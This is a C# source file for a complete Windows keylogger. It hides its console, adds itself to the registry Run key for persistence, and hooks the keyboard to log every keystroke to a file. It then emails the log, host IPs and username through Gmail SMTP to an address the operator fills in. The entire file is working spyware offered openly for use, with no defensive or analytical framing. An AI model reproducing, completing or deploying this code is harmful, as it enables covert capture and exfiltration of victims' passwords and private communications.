using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Net.Mail;

//check itnernet
using System.Runtime;
using System.Threading;

//Auto Run
using Microsoft.Win32;

namespace KLG1
{
    class Program
    {

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        private static int desc;
        private static bool internet;
        //Check internet ==================vv
        [DllImport("wininet.dll")]
        private extern static bool InternetGetConnectedState(out int Description, int ReserverValue);
        //Chekc internet===============================================================================^^

        //Hide console ======================vv
        #region Hide Console
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("User32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);
        #endregion
        //Hide Console =====================================================^^
        static void Main(string[] args)
        {
            if (!File.Exists(@"C:\ProgramData\ar.bnry"))
            {
                StreamWriter outputa = new StreamWriter(@"C:\ProgramData\ar.bnry", true);
                outputa.Write("False");
                outputa.Close();
            }
            #region Hide Console
            IntPtr hWnd = GetConsoleWindow();
            if (hWnd != IntPtr.Zero)
            {
                ShowWindow(hWnd, 0);
                if(!File.Exists(@"C:\ProgramData\mylog.bat"))
                {
                    StreamWriter mylog = new StreamWriter(@"C:\ProgramData\mylog.bat");
                    mylog.Close();
                }
            }
            string autoread = File.ReadAllText(@"C:\ProgramData\ar.bnry");
            if(autoread=="False")
            {
                RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                reg.SetValue("My Application", Application.ExecutablePath.ToString());
                File.WriteAllText(@"C:\ProgramData\ar.bnry", "01010100010100100101010101000101");
            }
            #endregion
            #region Check Internet
            string result = InternetGetConnectedState(out desc, 0).ToString();
            if (result == "True")
            {
                internet = true;
                if (internet = true || result == "True")
                {
                    if(File.ReadAllText(@"C:\ProgramData\mylog.bat").ToString()!="")
                    {
                        SendMessage();
                    }
                    hook = SetHook(llkProcedure);


                    Application.Run();
                    UnhookWindowsHookEx(hook);
                }

            }
            #endregion
            else
            {
                hook = SetHook(llkProcedure);

                Application.Run();
                UnhookWindowsHookEx(hook);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if(nCode >=0 && wParam==(IntPtr)WM_KEYDOWN)
            {
                StreamWriter output = new StreamWriter(@"C:\ProgramData\mylog.bat", true);
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {   
                    Console.Out.Write(".");
                    output.Write(".");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Return")
                {
                    Console.Out.Write("{ENTER} \n");
                    output.Write("{ENTER} \n");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "OemMinus")
                {
                    Console.Out.Write("_");
                    output.Write("_");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma" || ((Keys)vkCode).ToString() == "OemComma")
                {
                    Console.Out.Write(",");
                    output.Write(",");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write("{SPACE} ");
                    output.Write("{SPACE} ");
                    output.Close();
                }
                else
                {
                    Console.Out.Write((Keys)vkCode + " ");
                    output.Write((Keys)vkCode + " ");
                    output.Close();
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadI);
        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String IpModuleName);

        static void SendMessage()
        {
            
            string foldername = "File = " + @"C:\ProgramData\mylog.bat";
            string logcontets = "Content : \n" + File.ReadAllText(@"C:\ProgramData\mylog.bat");
            StreamWriter output = new StreamWriter(@"C:\ProgramData\mylog.bat", true);
            string emailBody = "";
            string subject = "";
            //send email
            DateTime now = DateTime.Now;
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach(var address in host.AddressList)
            {
                subject = "KLG From " + address;
                emailBody += "\nADDRESS : " + address;
            }
            emailBody += "Time : " + now.ToString();
            emailBody += "\nUsername = " + Environment.UserDomainName;
            emailBody += "\nHost : " + host;
            emailBody += "\nF_Location : " + foldername;
            emailBody += "\nContents : \n\n"+logcontets;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            client.Host = "smtp.gmail.com";
            client.Port = 587;
            MailMessage msg = new MailMessage();
            msg.From = new MailAddress("BOTEMAILHERE");
            msg.To.Add("YOUREMAILHERE");
            msg.Subject = subject;
            DateTime skrng = DateTime.Now;
            emailBody += "\n=========================================TERKIRIM===============================\n" +
                         "||                           " + skrng.ToString()+"                              ||\n" +
                         "===================================================================================";

            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("BOTEMAILHERE", "BOTSPASSWORDHERE");
            
            msg.Body = emailBody;
            
            client.Send(msg);
            output.Write("==========================================================================");
            output.Close();
            File.WriteAllText(@"C:\ProgramData\mylog.bat","");

        }

    }
}
